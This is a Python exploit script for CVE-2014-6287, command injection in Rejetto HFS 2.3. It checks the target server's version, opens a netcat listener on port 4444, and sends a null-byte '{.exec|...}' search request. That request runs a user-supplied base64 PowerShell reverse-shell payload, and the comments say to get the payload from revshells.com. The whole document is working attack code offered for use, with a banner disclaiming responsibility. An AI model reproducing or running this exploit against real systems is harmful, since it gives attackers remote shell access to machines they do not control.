#!/usr/bin/python3
import argparse
import requests
from urllib.parse import quote
from subprocess import run
from socket import error

# Go to https://revshells.com & enter your IP & port info. Select Powershell #3 (Base64) and copy pasta the payload
# into the payload variable

lport = '4444'

payload = ''

def banner():
    banner = """
 (                                   
 )\ )                    )    )      
(()/(   (   (     (   ( /( ( /(      
 /(_)) ))\  )\   ))\  )\()))\()) (   
(_))  /((_)((_) /((_)(_))/(_))/  )\  
| _ \(_))    ! (_))  | |_ | |_  ((_) 
|   // -_)  | |/ -_) |  _||  _|/ _ \ 
|_|_\\\\___| _/ |\___|  \__| \__|\___/ 
          |__/                       
----------------------------------------------------
[+] CVE:             2014-6287
[+] Discovery:       Daniele Linguaglossa
[+] Vulnerability:   Command Injection
[+] Version:         Rejetto 2.3
[+] Author:          https://github.com/SlizBinksman
[!] Note:            SlizBinksman takes no credit for
                     the original discovery and 
                     exploitation of this vulnerability.
                     You may need to run the exploit a few
                     times before you catch the shell.
                     Sliz IS NOT RESPONSIBLE for your
                     actions.
-----------------------------------------------------
[*] Checking Software Version"""
    print(banner)
    return versionCheck()

def versionCheck():
    if payload == '':
        exit('[!] Empty String In Payload Variable Detected. Please Visit https://www.revshells.com And Fill In The Payload Variable With PowerShell Base64.')
    try:
        response = requests.get(args.URL)
        version = response.headers.get('Server').strip('HFS ')
        if version == '2.3':
            print('[*] Target Is Likely Vulnerable. Proceeding.')
            return exploit()
        else:
            exit('[-] Target Is Not Vulnerable. Quitting.')
    except error:
        exit('[-] Could Not Connect To Server.')

def openListener():
    print('[*] Opening Listener & Attempting Exploit.....')
    run(f'gnome-terminal -e "nc -lvnp {lport}"',shell=True,capture_output=True)

def exploit():
    openListener()
    try:
        requests.get(f"{args.URL}/"+"/?search=%00{.exec|"+quote(payload)+".}")
        exit('[*] Nullbyte Command Sent. Good Luck.')
    except error:
        exit('[-] Could Not Connect To Server.')

if __name__ == '__main__':

    mainArguments = argparse.ArgumentParser()
    mainArguments.add_argument('URL',help='Target URL',type=str)
    args = mainArguments.parse_args()

    try:
        banner()
    except KeyboardInterrupt:
        exit('[-] Aborting....')
